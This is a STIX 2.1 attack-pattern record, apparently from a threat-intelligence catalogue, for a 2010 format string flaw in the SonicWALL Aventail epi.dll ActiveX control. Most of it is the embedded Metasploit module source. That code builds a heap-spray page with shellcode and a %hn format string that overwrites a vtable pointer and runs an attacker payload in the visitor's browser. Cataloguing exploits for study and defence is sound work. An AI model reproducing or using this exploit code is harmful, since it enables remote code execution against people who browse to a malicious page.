{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dda62a2e-77d3-432d-afff-5b1d3e9147ab",
    "created": "2024-08-14T16:43:33.67084Z",
    "modified": "2024-08-14T16:43:33.670844Z",
    "name": "SonicWALL Aventail epi.dll AuthCredential Format String",
    "description": " This module exploits a format string vulnerability within version 10.0.4.x and 10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX control (epi.dll). By calling the 'AuthCredential' method with a specially crafted Unicode format string, an attacker can cause memory corruption and execute arbitrary code.  Unfortunately, it does not appear to be possible to indirectly re-use existing stack data for more reliable exploitation. This is due to several particulars about this vulnerability. First, the format string must be a Unicode string which uses two bytes per character. Second, the buffer is allocated on the stack using the 'alloca' function. As such, each additional format specifier (%x) will add four more bytes to the size allocated. This results in the inability to move the read pointer outside of the buffer.  Further testing showed that using specifiers that pop more than four bytes does not help. Any number of format specifiers will result in accessing the same value within the buffer.  NOTE: It may be possible to leverage the vulnerability to leak memory contents. However, that has not been fully investigated at this time.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/aventail_epi_activex.rb",
            "external_id": "aventail_epi_activex.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sotiriu.de/adv/NSOADV-2010-005.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking # heap spray and address shifty\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SonicWALL Aventail epi.dll AuthCredential Format String',\n      'Description'    => %q{\n          This module exploits a format string vulnerability within version 10.0.4.x and\n        10.5.1 of the SonicWALL Aventail SSL-VPN Endpoint Interrogator/Installer ActiveX\n        control (epi.dll). By calling the 'AuthCredential' method with a specially\n        crafted Unicode format string, an attacker can cause memory corruption and\n        execute arbitrary code.\n\n        Unfortunately, it does not appear to be possible to indirectly re-use existing\n        stack data for more reliable exploitation. This is due to several particulars\n        about this vulnerability. First, the format string must be a Unicode string,\n        which uses two bytes per character. Second, the buffer is allocated on the\n        stack using the 'alloca' function. As such, each additional format specifier (%x)\n        will add four more bytes to the size allocated. This results in the inability to\n        move the read pointer outside of the buffer.\n\n        Further testing showed that using specifiers that pop more than four bytes does\n        not help. Any number of format specifiers will result in accessing the same value\n        within the buffer.\n\n        NOTE: It may be possible to leverage the vulnerability to leak memory contents.\n        However, that has not been fully investigated at this time.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nikolas Sotiriu',  # original discovery / poc\n          'jduck'             # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '67286'],\n          [ 'URL', 'http://sotiriu.de/adv/NSOADV-2010-005.txt' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'epi.dll v10.0.4.18 on Windows XP SP3',\n            {\n              # NOTE: Unfortunately, this address varies from execution to execution\n              'Write' => 0x1240000 + 0x501d4 + 2, # smashed high 16-bits of a vtable ptr :)\n              # 0x1d5005c, # crashes on deref+call\n              'Ret'   => 0x04040404\n            }\n          ]\n        ],\n      'DisclosureDate' => '2010-08-19',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    clsid = \"2A1BE1E7-C550-4D67-A553-7F2D3A39233D\"\n    progid = \"Aventail.EPInterrogator.10.0.4.018\"\n\n    method = \"AuthCredential\"\n\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(p.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    write   = Rex::Text.to_unescape([target['Write']].pack('V'))\n\n    # Setup format string offset\n    printed = 0xb1 - 5\n    ret     = (target.ret >> 16) - printed\n\n    # Setup heap spray\n    blocksize = 0x40000\n    fillto    = 300\n\n    # Randomize the javascript variable names\n    axobj        = \"axobj\" #rand_text_alpha(rand(100) + 1)\n    j_format     = \"fmt\" # rand_text_alpha(rand(100) + 1)\n    j_counter    = \"i\" # rand_text_alpha(rand(30) + 2)\n    # heap spray vars\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n\n    # NOTE: the second assignment triggers the shellcode\n    content = %Q|<html>\n<object classid='clsid:#{clsid}' id='#{axobj}'></object>\n<script>\n#{j_shellcode}=unescape('#{shellcode}');\n#{j_nops}=unescape('#{nops}');\n#{j_headersize}=20;\n#{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;\nwhile(#{j_nops}.length<#{j_slackspace})#{j_nops}+=#{j_nops};\n#{j_fillblock}=#{j_nops}.substring(0,#{j_slackspace});\n#{j_block}=#{j_nops}.substring(0,#{j_nops}.length-#{j_slackspace});\nwhile(#{j_block}.length+#{j_slackspace}<#{blocksize})#{j_block}=#{j_block}+#{j_block}+#{j_fillblock};\n#{j_memory}=new Array();\nfor(#{j_counter}=0;#{j_counter}<#{fillto};#{j_counter}++)#{j_memory}[#{j_counter}]=#{j_block}+#{j_shellcode};\n\n#{j_format} = unescape(\"#{write}\");\n#{j_format} += '%#{ret}x';\nfor (#{j_counter} = 0; #{j_counter} < 22; #{j_counter}++)\n  #{j_format} += '%x';\n#{j_format} += '%hn';\n\n#{axobj}.#{method} = #{j_format};\n#{axobj}.#{method} = #{j_format};\n</script>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-19",
    "x_mitre_platforms": [
        "win'"
    ]
}